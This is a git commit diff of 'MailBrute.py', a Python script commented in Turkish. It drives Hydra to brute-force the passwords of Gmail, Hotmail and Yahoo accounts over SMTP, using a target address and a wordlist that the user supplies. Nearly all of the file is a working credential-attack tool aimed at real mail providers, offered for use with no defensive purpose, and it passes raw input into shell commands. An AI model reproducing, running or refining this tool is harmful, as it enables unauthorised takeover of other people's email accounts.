ed75fd08e160f931103487698b93f052e7cd4505
not-body <81175625+not-body@users.noreply.github.com>
2021-10-09 23:10:00 +0300

    MailBrute
    *> pip install colorama
    *> python3 MailBrute.py

--- MailBrute.py
+++ MailBrute.py
@@ -1,64 +1,104 @@
+
+
 #CODED by NotBody
 
+ 
+
 """
-Tool hydra ile brute force atmaktadır 
-Kali linuxda çalışmaktadır
+
+Tool hydra ile brute force atmaktadır
+
+Termux İçin Ayarlanmıştır
+
 NotBody tarafından kodlanmıştır
 
+Hydra ile farklı farklı brute force
+
+yapılabilir ben burda mail brute üzerine çalıştım ve daha kolay bir kullanım kazandırdım umarım beğenirsiniz
 
 NotBody instagram ;
+
 @NotBodyOfficial
 
- import cowsay
-ModuleNotFoundError: No module named 'cowsay'
-hatası ile karşılaşırsanız
-apt install cowsay
-
+ 
 
 """
-import cowsay
+
+import sys
+
+import colorama
+
 import os
+
 from os import system
+
 from time import sleep as timeout
+
+from colorama import Fore, Back, Style
 
 os.system("clear")
 
-cowsay.daemon("Mail Brute Force")
+ 
+
+os.system("toilet -f bigmono9 -F gay Mail Brute Force")
+
+colorama.init()
 
 banner = """
 
-01)=> GMAİL
-02)=> HOTMAİL
-03)=> YAHOO
+ 
+
+[01] GMAİL
+
+[02] HOTMAİL
+
+[03] YAHOO
+
 Coded by NotBody
+
 Hydra üzerinden çalışmaktadır!!!!
+
 """
+
+print(Fore.BLUE)
+
 print(banner)
 
+print(Fore.RED)
+
 islem = input("""
+
 ┌──(Mail💀Brute)-[Mail Türü]
 └─# """)
 
+ 
+
 wordlst = input("""
+
 ┌──(Mail💀Brute)-[Word List]
 └─# """)
 
+ 
+
 mail = input("""
+
 ┌──(Mail💀Brute)-[Mail]
 └─# """)
 
+print(Fore.WHITE)
+
 if islem.strip() == "1" or islem.strip() == "01":
+
     os.system("hydra smtp.gmail.com smtp -l [email]"+ mail +"[/email] -P " +wordlst+ " -s 465 -S -v -V")
 
+ 
+
 if islem.strip() == "2" or islem.strip() == "02":
+
     os.system("hydra smtp.live.com smtp -l [email]"+ mail +"[/email] -P " +wordlst+ " -s 587 -S -v -V")
 
+ 
+
 if islem.strip() == "3" or islem.strip() == "03":
+
     os.system("hydra smtp.mail.yahoo.com smtp -l [email]"+ mail +"[/email] -P " +wordlst+ " -s 587 -S -v -V")
-
-else :
-    print("\nYanlış seçim")
-    timeout(1)
-    os.system("python3 MailBrute.py")
-
-
